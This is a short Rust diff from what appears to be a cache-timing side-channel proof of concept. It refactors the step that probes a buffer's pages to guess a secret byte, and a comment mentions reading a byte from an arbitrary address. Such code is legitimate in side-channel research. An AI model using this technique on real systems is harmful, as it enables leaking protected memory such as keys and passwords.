@@ -101,18 +101,10 @@ unsafe fn guess_byte_once(secret: *const u8, buf: *const u8) -> u8 {
     }
 
     // time how long it takes to read the first cache line of each page of buf
-    let mut times: [u64; 256] = uninitialized();
-    for i in 0..256 {
-        times[i] = probe(buf.add(i * PAGE_SIZE))
-    }
-
     // the index with the smallest time is likely the value of *secret
-    times
-        .iter()
-        .enumerate()
-        .min_by_key(|&(_, item)| item)
-        .unwrap()
-        .0 as u8
+    (0..256)
+        .min_by_key(|i| probe(buf.add(i * PAGE_SIZE)))
+        .unwrap() as u8
 }
 
 // read a byte from an arbitrary address
